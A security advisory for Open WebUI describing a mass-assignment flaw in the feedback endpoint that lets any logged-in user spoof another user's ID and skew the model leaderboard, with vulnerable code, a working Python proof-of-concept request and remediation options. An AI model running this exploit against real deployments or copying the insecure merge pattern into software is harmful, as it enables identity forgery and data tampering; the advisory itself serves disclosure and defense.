# [M] Open WebUI: Mass Assignment via FeedbackForm extra=allow Allows Feedback User ID Spoofing and Evaluation Data Manipulation

## Summary
Severity: Medium
Advisory: GHSA-rjmp-vjf2-qf4g
CVE: CVE-2026-45396
CWE: CWE-915
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-rjmp-vjf2-qf4g
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.5

## Details
# Mass Assignment in Feedback Creation Allows User ID Spoofing and Evaluation Data Manipulation

## Summary

The `POST /api/v1/evaluations/feedback` endpoint in Open WebUI v0.9.2 is vulnerable to mass assignment via `FeedbackForm`, which uses `model_config = ConfigDict(extra='allow')`. Due to an insecure dictionary merge order in `insert_new_feedback()`, an authenticated attacker can inject a `user_id` field in the request body that overwrites the server-derived value, creating feedback records attributed to any arbitrary user. This corrupts the model evaluation leaderboard (Elo ratings) and enables identity spoofing.

## Details

The vulnerability exists in two layers:

### 1. Model Layer — Insecure Dict Merge Order

**File:** `backend/open_webui/models/feedbacks.py`, lines 148–160

```python
async def insert_new_feedback(
    self, user_id: str, form_data: FeedbackForm, db: Optional[AsyncSession] = None
) -> Optional[FeedbackModel]:
    async with get_async_db_context(db) as db:
        id = str(uuid.uuid4())
        feedback = FeedbackModel(
            **{
                'id': id,
                'user_id': user_id,       # ← Server-set from auth token
                'version': 0,
                **form_data.model_dump(),  # ← OVERWRITES 'id', 'user_id', 'version'
                'created_at': int(time.time()),
                'updated_at': int(time.time()),
            }
        )
```

In Python, when a dictionary literal contains duplicate keys, the **last value wins**. Since `**form_data.model_dump()` appears after `'user_id': user_id`, any `user_id` field in the form data overwrites the authenticated user's ID.

### 2. Schema Layer — `extra='allow'` on Request Form

**File:** `backend/open_webui/models/feedbacks.py`, line 106

```python
class FeedbackForm(BaseModel):
    type: str
    data: Optional[RatingData] = None
    meta: Optional[dict] = None
    snapshot: Optional[SnapshotData] = None
    model_config = ConfigDict(extra='allow')  # ← Accepts arbitrary extra fields
```

The `extra='allow'` config means Pydantic will accept and preserve any extra fields in the request body, including `user_id`, `id`, and `version`. These are then spread into the `FeedbackModel` constructor, overwriting server-set values.

### Contrast with Secure Pattern

Other models in the same codebase use the correct ordering. For example, `backend/open_webui/models/functions.py`, line 120:

```python
function = FunctionModel(**{
    **form_data.model_dump(),   # ← Spread FIRST
    'user_id': user_id,         # ← Server value AFTER → always wins
})
```

And `ModelForm` at `backend/open_webui/models/models.py` uses `extra='ignore'`, which is the strictest approach.

## Impact

### 1. User Identity Spoofing
An attacker can create feedback records attributed to any user by specifying their `user_id`. The admin export endpoint (`GET /api/v1/evaluations/feedbacks/export`) and admin list (`GET /api/v1/evaluations/feedbacks/all`) will show the spoofed `user_id` as the feedback author.

### 2. Model Evaluation Leaderboard Manipulation
The Elo rating system at `backend/open_webui/routers/evaluations.py` computes model rankings directly from feedback records. An attacker can inject fake rating feedback to:
- Artificially inflate ratings for a specific model
- Deflate ratings for competitor models
- Make organizational model evaluation decisions unreliable

### 3. Record ID Control
By injecting a custom `id`, an attacker controls the UUID of the feedback record. While this won't overwrite existing records (primary key constraint), it enables predictable record IDs that could be useful in other attack chains.

## PoC

```python
import requests

BASE_URL = "http://localhost:8080"

# 1. Login as attacker
session = requests.Session()
login_resp = session.post(f"{BASE_URL}/api/v1/auths/signin", json={
    "email": "attacker@example.com",
    "password": "attackerpass"
})
token = login_resp.json()["token"]
headers = {"Authorization": f"Bearer {token}"}

# 2. Create feedback attributed to a different user (victim)
VICTIM_USER_ID = "12345678-aaaa-bbbb-cccc-000000000000"

resp = session.post(
    f"{BASE_URL}/api/v1/evaluations/feedback",
    headers=headers,
    json={
        "type": "rating",
        "data": {
            "model_id": "gpt-4o",
            "rating": 1,
            "sibling_model_ids": ["claude-3-opus"],
        },
        # Mass assignment: these extra fields are accepted due to extra='allow'
        # and overwrite server-set values due to dict merge order
        "user_id": VICTIM_USER_ID,  # Overwrites authenticated user ID
        "version": 999,             # Overwrites default version
    }
)

feedback = resp.json()
print(f"Feedback created with user_id: {feedback['user_id']}")
# Expected: attacker's own user_id
# Actual: VICTIM_USER_ID (12345678-aaaa-bbbb-cccc-000000000000)
assert feedback["user_id"] == VICTIM_USER_ID, "Mass assignment successful!"
```

## Severity

**CVSS 3.1:** 5.4 (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L`

- **Attack Vector:** Network
- **Attack Complexity:** Low
- **Privileges Required:** Low (any authenticated user)
- **User Interaction:** None
- **Impact:** Integrity (feedback data falsification) + limited Availability (leaderboard reliability)

## Suggested Remediation

### Option 1: Fix dict merge order (minimal fix)
```python
feedback = FeedbackModel(
    **{
        **form_data.model_dump(),   # Spread FIRST
        'id': id,                    # Server values AFTER (always win)
        'user_id': user_id,
        'version': 0,
        'created_at': int(time.time()),
        'updated_at': int(time.time()),
    }
)
```

### Option 2: Remove `extra='allow'` from FeedbackForm (recommended)
```python
class FeedbackForm(BaseModel):
    type: str
    data: Optional[RatingData] = None
    meta: Optional[dict] = None
    snapshot: Optional[SnapshotData] = None
    model_config = ConfigDict(extra='ignore')  # Reject unexpected fields
```

### Option 3: Explicit field assignment (most secure)
```python
feedback = FeedbackModel(
    id=str(uuid.uuid4()),
    user_id=user_id,
    version=0,
    type=form_data.type,
    data=form_data.data.model_dump() if form_data.data else {},
    meta=form_data.meta or {},
    snapshot=form_data.snapshot.model_dump() if form_data.snapshot else {},
    created_at=int(time.time()),
    updated_at=int(time.time()),
)
```

## Affected Versions

- v0.9.2 (current latest, confirmed vulnerable)
- Likely all versions since feedback/evaluation feature was introduced

## References

- Prior advisory: "Mass Assignment via Pydantic extra='allow' Allows Creating Folders in Other Users' Accounts" (patched in v0.9.0) — same root cause class, different endpoint

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-rjmp-vjf2-qf4g
- https://nvd.nist.gov/vuln/detail/CVE-2026-45396
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.5
